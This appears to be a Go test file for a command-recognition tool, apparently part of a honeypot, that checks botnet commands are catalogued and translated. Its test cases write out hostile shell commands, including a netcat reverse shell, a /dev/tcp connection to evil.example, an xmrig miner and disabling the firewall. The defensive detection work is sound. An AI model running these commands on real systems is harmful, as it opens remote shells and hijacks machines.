package saber

import "testing"

// TestReconocimientoComandosAmpliado fija que los comandos habituales de un
// ataque de botnet -reconocimiento, shell inversa, minado, persistencia- se
// reconocen sin IA y traen su traduccion al ingles.
func TestReconocimientoComandosAmpliado(t *testing.T) {
	casos := []string{
		"[ -f /etc/os-release ] && echo ok",
		"cd /tmp || cd /dev/shm",
		"echo -e '\\x7f\\x45\\x4c\\x46' > .a",
		"nc -e /bin/sh 1.2.3.4 4444",
		"exec 5<>/dev/tcp/evil.example/9999",
		"xmrig -o stratum+tcp://pool:3333",
		"whoami",
		"systemctl disable firewalld",
		"perl -e 'exit'",
		"base64 -d payload.b64",
	}
	for _, c := range casos {
		n, ok := DeComando(c)
		if !ok {
			t.Errorf("no reconocido: %q", c)
			continue
		}
		if en := n.En("en"); en.Que == n.Que {
			t.Errorf("sin traduccion EN: %q (Que=%q)", c, n.Que)
		}
	}
}

func TestComandoComplejoNoSeDaPorConocido(t *testing.T) {
	// Un reconocimiento largo con busybox dentro: el catalogo casaria
	// "busybox", pero es demasiado para una nota suelta -> a la IA.
	gigante := "export PATH=/bin; uname=$(uname -s || busybox uname -s); arch=$(uname -m); cpus=$(nproc || busybox nproc); echo done"
	if !ComandoComplejo(gigante) {
		t.Fatal("un reconocimiento largo encadenado deberia ser complejo")
	}
	if ComandoConocido("ssh", gigante) {
		t.Fatal("un comando complejo NO deberia darse por conocido")
	}
	// Los atomicos siguen reconociendose por el catalogo.
	if ComandoComplejo("uname -a") {
		t.Fatal("uname -a no es complejo")
	}
	if !ComandoConocido("ssh", "uname -a") {
		t.Fatal("uname -a deberia seguir siendo conocido")
	}
	if !ComandoConocido("ssh", "chmod +x /tmp/a") {
		t.Fatal("chmod +x deberia seguir siendo conocido")
	}
}
